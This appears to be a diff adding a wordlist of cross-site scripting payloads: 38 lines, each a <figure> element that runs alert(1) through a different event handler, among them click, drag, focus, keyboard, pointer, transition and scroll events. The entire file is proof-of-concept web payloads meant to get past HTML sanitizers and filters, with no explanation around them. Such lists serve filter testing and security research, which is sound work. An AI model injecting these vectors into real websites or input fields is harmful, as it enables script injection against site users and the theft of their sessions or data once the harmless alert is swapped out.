@@ -1,0 +1,38 @@
+<figure contenteditable onbeforeinput=alert(1)>test
+<figure draggable="true" ondrag="alert(1)" style=display:block>test</figure>
+<figure draggable="true" ondragend="alert(1)" style=display:block>test</figure>
+<figure draggable="true" ondragenter="alert(1)" style=display:block>test</figure>
+<figure draggable="true" ondragleave="alert(1)" style=display:block>test</figure>
+<figure draggable="true" ondragstart="alert(1)" style=display:block>test</figure>
+<figure id=x style="transition:outline 1s" ontransitionend=alert(1) tabindex=1></figure>
+<figure id=x tabindex=1 onfocus=alert(1)></figure>
+<figure id=x tabindex=1 onfocusin=alert(1)></figure>
+<figure onafterscriptexecute=alert(1)><script>1</script>
+<figure onbeforescriptexecute=alert(1)><script>1</script>
+<figure onblur=alert(1) id=x tabindex=1 style=display:block>test</figure><input value=clickme>
+<figure onclick="alert(1)" style=display:block>test</figure>
+<figure oncontextmenu="alert(1)" style=display:block>test</figure>
+<figure oncopy=alert(1) value="XSS" autofocus tabindex=1 style=display:block>test
+<figure oncut=alert(1) value="XSS" autofocus tabindex=1 style=display:block>test
+<figure ondblclick="alert(1)" autofocus tabindex=1 style=display:block>test</figure>
+<figure onfocusout=alert(1) autofocus tabindex=1 style=display:block>test</figure><input value=clickme>
+<figure onkeydown="alert(1)" contenteditable style=display:block>test</figure>
+<figure onkeypress="alert(1)" contenteditable style=display:block>test</figure>
+<figure onkeyup="alert(1)" contenteditable style=display:block>test</figure>
+<figure onmousedown="alert(1)" style=display:block>test</figure>
+<figure onmouseenter="alert(1)" style=display:block>test</figure>
+<figure onmouseleave="alert(1)" style=display:block>test</figure>
+<figure onmousemove="alert(1)" style=display:block>test</figure>
+<figure onmouseout="alert(1)" style=display:block>test</figure>
+<figure onmouseover="alert(1)" style=display:block>test</figure>
+<figure onmouseup="alert(1)" style=display:block>test</figure>
+<figure onmousewheel=alert(1) style=display:block>requires scrolling
+<figure onpointerdown=alert(1) style=display:block>XSS</figure>
+<figure onpointerenter=alert(1) style=display:block>XSS</figure>
+<figure onpointerleave=alert(1) style=display:block>XSS</figure>
+<figure onpointermove=alert(1) style=display:block>XSS</figure>
+<figure onpointerout=alert(1) style=display:block>XSS</figure>
+<figure onpointerover=alert(1) style=display:block>XSS</figure>
+<figure onpointerrawupdate=alert(1) style=display:block>XSS</figure>
+<figure onpointerup=alert(1) style=display:block>XSS</figure>
+<figure onscrollend=alert(1) style="display:block;overflow:auto;border:1px dashed;width:500px;height:100px;"><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><span id=x>test</span></figure>
